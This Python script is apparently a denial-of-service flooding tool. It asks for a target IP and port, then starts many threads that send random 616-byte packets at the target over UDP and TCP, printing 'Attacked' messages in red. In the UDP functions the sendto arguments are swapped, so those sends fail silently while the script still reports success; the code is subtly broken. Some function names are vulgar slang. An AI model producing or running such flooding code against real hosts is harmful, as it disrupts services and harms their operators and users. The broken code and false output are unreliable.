import random
import time
import socket
import threading
print("\033[31m")
ip = str(input("====> Ip Hosting: "))
port = int(input("====> Port Hosting: "))
choice = str(input("====> Attacking? (y/n): "))
times = int(input("====> Packets: "))
threads = int(input("====> Threads: "))
print("\033[30;1m")
def ext1():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext2():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def ext3():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def ext4():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext5():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext6():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext7():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext8():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext9():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext10():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def kntl():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def memek():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

for y in range(threads):
  if choice == "y":
    th = threading.Thread(target = ext1)
    th.start()
    th = threading.Thread(target = ext2)
    th.start()
    th = threading.Thread(target = ext3)
    th.start()
    th = threading.Thread(target = ext4)
    th.start()
    th = threading.Thread(target = ext5)
    th.start()
    th = threading.Thread(target = ext6)
    th.start()
    th = threading.Thread(target = ext7)
    th.start()
    th = threading.Thread(target = ext8)
    th.start()
    th = threading.Thread(target = ext9)
    th.start()
    th = threading.Thread(target = ext10)
    th.start()
  else:
    th = threading.Thread(target = kntl)
    th.start()
    th = threading.Thread(target = memek)
    th.start()
